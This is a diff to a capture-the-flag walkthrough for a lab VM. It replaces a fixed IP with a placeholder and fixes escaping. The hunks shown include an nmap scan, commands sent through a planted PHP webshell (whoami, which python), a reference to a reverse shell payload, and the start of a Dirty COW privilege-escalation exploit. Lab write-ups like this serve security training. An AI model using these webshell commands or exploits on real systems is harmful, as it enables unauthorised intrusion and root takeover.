@@ -27,7 +27,7 @@
 3. Using **nmap**, the internal network was scanned to find live hosts and services:
 
 	```bash
-	nmap -p- -sV 192.168.190.182
+	nmap -p- -sV <vm-ip>
 	```
 
 	Result: Host with several open services:
@@ -100,7 +100,7 @@
 	Verify webshell access:
 
 	```
-	https://192.168.190.182/forum/templates_c/payload.php?cmd=whoami
+	https://<vm-ip>/forum/templates_c/payload.php?cmd=whoami
 	```
 
 	Confirm it outputs `www-data`.
@@ -110,7 +110,7 @@
 	Checked for Python binary:
 
 	```
-	https://192.168.190.182/forum/templates_c/payload.php?cmd=which%20python
+	https://<vm-ip>/forum/templates_c/payload.php?cmd=which%20python
 	```
 
 	Got `/usr/bin/python`. Now we can give a reverse shell payload:
@@ -169,7 +169,7 @@
 
 11. Dirty COW Exploit to Root
 
-	Upload and compile **dirty\_cow\.c** exploit in `/tmp` as lmezard.
+	Upload and compile **dirty_cow.c** exploit in `/tmp` as lmezard.
 
 	```bash
 	cat > dirty_cow.c << EOF
